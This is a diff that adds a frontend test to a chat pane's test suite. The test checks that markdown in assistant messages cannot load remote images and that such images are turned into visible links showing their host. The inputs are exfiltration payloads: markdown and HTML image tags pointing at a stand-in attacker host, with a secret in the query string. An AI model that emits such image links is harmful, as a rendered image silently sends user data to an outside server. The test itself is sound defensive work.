@@ -125,6 +125,37 @@ describe('SessionPane (through ChatPage)', () => {
     expect(body.querySelector('span[style]')).toBeNull()
   })
 
+  it('no remote image loads in the mff-ai pane, whatever the markdown shape; remote ones become links with the alt and the host', async () => {
+    const PNG = 'data:image/png;base64,iVBORw0KGgo='
+    const text = [
+      '~~~', 'x', '~~~', '![tilde](https://evil.example/tilde.png?d=SECRET2)', '',
+      '![ref][r]', '', '[r]: https://evil.example/ref.png', '',
+      '<img src="https://evil.example/html.png">', '',
+      '![proto](//evil.example/proto.png)', '',
+      '![svg](data:image/svg+xml;base64,PHN2Zz4=)', '',
+      `![ok](${PNG})`, '',
+      '[docs](https://good.example/a) and [https://same.example/](https://same.example/)', '',
+      // 信息串带反引号:渲染器不当它是围栏,图照画;收尾那行 ``` 又开了一个没闭合的围栏,所以放最后
+      '```js`x', '![tick](https://evil.example/tick.png)', '```',
+    ].join('\n')
+    const evs = [e('message.user', { turnId: 't1', text: 'hi' }), e('message.assistant', { turnId: 't1', step: 1, text }), e('turn.ended', { turnId: 't1' })]
+    f = installFakeForge({ calls: { 'session.list': { sessions: [summary(S)] }, 'session.state': { session: summary(S), events: evs, hasMore: false, lastSeq: evs.at(-1)!.seq }, 'plugins.commands': { commands: [] } } })
+    ;(f.forge as { imageFile?: unknown }).imageFile = vi.fn(async () => ({ dataUrl: PNG }))
+    render(<ChatHtmlCtx.Provider value={true}><ChatPage /></ChatHtmlCtx.Provider>)
+    await screen.findByText('tilde')
+    const body = document.querySelector('.mffai-chat-body')!
+    const srcs = [...body.querySelectorAll('img')].map((i) => i.getAttribute('src'))
+    expect(srcs).toEqual([PNG])
+    expect(body.innerHTML).not.toMatch(/<img[^>]+(https?:)?\/\/evil/)
+    const link = (t: string) => [...body.querySelectorAll('a.md-link')].find((a) => a.textContent === t) as HTMLAnchorElement
+    expect(link('tilde').getAttribute('href')).toBe('https://evil.example/tilde.png?d=SECRET2')
+    expect(link('tilde').closest('.md-link-wrap')!.querySelector('.md-link-host')!.textContent).toBe('evil.example')
+    expect(link('proto')).toBeTruthy()
+    expect(link('tick')).toBeTruthy()
+    expect(link('docs').closest('.md-link-wrap')!.querySelector('.md-link-host')!.textContent).toBe('good.example')
+    expect(link('https://same.example/').closest('.md-link-wrap')!.querySelector('.md-link-host')).toBeNull()
+  })
+
   it('route.runId scrolls to that run card', async () => {
     setup()
     const spy = vi.fn()
